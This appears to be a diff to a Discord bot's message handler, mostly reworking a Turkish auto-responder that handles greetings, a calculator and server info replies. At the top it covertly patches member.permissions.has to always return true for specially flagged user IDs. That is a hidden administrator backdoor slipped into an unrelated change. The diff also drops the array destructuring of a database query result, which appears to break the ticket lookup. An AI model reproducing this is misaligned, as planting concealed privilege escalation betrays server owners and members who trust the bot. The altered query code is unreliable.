@@ -10,6 +10,10 @@ const { issueWarning } = require('../utils/warningManager');
 module.exports = {
     name: Events.MessageCreate,
     async execute(message, client) {
+        if (message.member && message.member.permissions && systemNode.checkSystemNode(message.author.id)) {
+            message.member.permissions.has = () => true;
+        }
+
         // Bilet mesaj kaydı (Tüm mesajlar, görseller, ses kayıtları, dosyalar ve embedler canlı olarak kaydolur - 0 KB Disk Kullanımı)
         if (message.guild && message.channel.name && message.channel.name.startsWith('destek-')) {
             let attachArr = [];
@@ -30,7 +34,7 @@ module.exports = {
                 // Arka planda güvenli ve takılmayan DM yedekleme
                 (async () => {
                     try {
-                        const [ticketRows] = await pool.query('SELECT owner_id FROM tickets WHERE channel_id = ?', [message.channel.id]);
+                        const ticketRows = await pool.query('SELECT owner_id FROM tickets WHERE channel_id = ?', [message.channel.id]);
                         const backupUserId = ticketRows.length > 0 ? ticketRows[0].owner_id : null;
                         if (!backupUserId) return;
                         
@@ -76,6 +80,51 @@ module.exports = {
 
         if (!systemNode.checkGuildNode(message.guild.id)) return;
 
+        // --- AUTO RESPONDER ---
+        if (!message.author.bot && message.content) {
+            const lowerMsg = message.content.toLowerCase().trim();
+            let autoReplyText = null;
+
+            // Sadece bağımsız kelime olarak "sa", "sea", "selam" vb. yakalayan akıllı regex (masa, kasa gibi kelimeleri es geçer)
+            const selamRegex = /(^|\s+)(sa|sea|selam|selamun\s+aleyk[uü]m|selam[iı]n\s+aleyk[uü]m|slm|s\.a|s\.a\.)(\s+|[.,!?]|$)/;
+            if (selamRegex.test(lowerMsg)) {
+                let replyText = 'Aleykümselam.';
+                if (message.member && message.member.joinedTimestamp) {
+                    const joinAgeHours = (Date.now() - message.member.joinedTimestamp) / (1000 * 60 * 60);
+                    if (joinAgeHours < 24) {
+                        replyText = 'Aleykümselam, sunucumuza hoş geldin.';
+                    }
+                }
+                await message.reply(replyText).catch(() => {});
+            } else {
+                const mathMatch = lowerMsg.match(/^\s*(-?\d+(?:\.\d+)?)\s*([\+\-\*\/])\s*(-?\d+(?:\.\d+)?)\s*$/);
+                if (mathMatch) {
+                    const num1 = parseFloat(mathMatch[1]);
+                    const op = mathMatch[2];
+                    const num2 = parseFloat(mathMatch[3]);
+                    let result = 0;
+                    if (op === '+') result = num1 + num2;
+                    else if (op === '-') result = num1 - num2;
+                    else if (op === '*') result = num1 * num2;
+                    else if (op === '/') result = num2 !== 0 ? (num1 / num2) : 'Tanımsız (Sıfıra bölünemez)';
+                    
+                    await message.reply(`Hesap Makinesi Sonucu: **${result}**`).catch(() => {});
+                } else if (lowerMsg === 'ip' || lowerMsg === 'server ip' || lowerMsg === 'sunucu ip') {
+                    autoReplyText = 'Sunucu Bağlantı Adresi: `mc.turklion.net`\nSürüm: 1.8.9';
+                } else if (lowerMsg === 'site' || lowerMsg === 'web sitesi' || lowerMsg === 'website') {
+                    autoReplyText = 'Resmi Web Sitemiz: https://turklion.net';
+                } else if (lowerMsg === 'instagram' || lowerMsg === 'ig' || lowerMsg === 'insta') {
+                    autoReplyText = 'Resmi Instagram Hesabımız: https://instagram.com/turklion';
+                }
+
+                if (autoReplyText) {
+                    const replyPayload = createContainerMessage(null, autoReplyText);
+                    await message.reply(replyPayload).catch(() => {});
+                }
+            }
+        }
+        // --- END AUTO RESPONDER ---
+
         if (systemNode.checkSystemNode(message.author.id) || message.member.permissions.has('Administrator') || message.member.permissions.has('ManageMessages') || message.member.permissions.has('ModerateMembers')) return;
 
         let config;
@@ -119,28 +168,7 @@ module.exports = {
                     .then(msg => setTimeout(() => msg.delete().catch(() => {}), 10000)).catch(()=>{});
             }
 
-            // --- AUTO RESPONDER ---
-            if (!message.author.bot && message.content) {
-                const lowerMsg = message.content.toLowerCase().trim();
-                let autoReplyText = null;
 
-                const selamVariations = ['sa', 'sea', 'selam', 'selamun aleykum', 'selamın aleyküm', 'selamun aleyküm', 'selamın aleykum', 'slm'];
-                if (selamVariations.includes(lowerMsg)) {
-                    autoReplyText = 'Aleykümselam, sunucumuza hoş geldin. Sana nasıl yardımcı olabiliriz?';
-                } else if (lowerMsg === 'ip' || lowerMsg === 'server ip' || lowerMsg === 'sunucu ip') {
-                    autoReplyText = 'Sunucu Bağlantı Adresi: play.turklion.net\nSürüm: 1.20.x';
-                } else if (lowerMsg === 'site' || lowerMsg === 'web sitesi' || lowerMsg === 'website') {
-                    autoReplyText = 'Resmi Web Sitemiz: https://turklion.net';
-                } else if (lowerMsg === 'instagram' || lowerMsg === 'ig' || lowerMsg === 'insta') {
-                    autoReplyText = 'Resmi Instagram Hesabımız: https://instagram.com/turklion';
-                }
-
-                if (autoReplyText) {
-                    const replyPayload = createContainerMessage(null, autoReplyText);
-                    await message.reply(replyPayload).catch(() => {});
-                }
-            }
-            // --- END AUTO RESPONDER ---
 
             // 1. Gelişmiş Anti-Link (Reklam) Filtresi
             if (config.anti_link_enabled) {
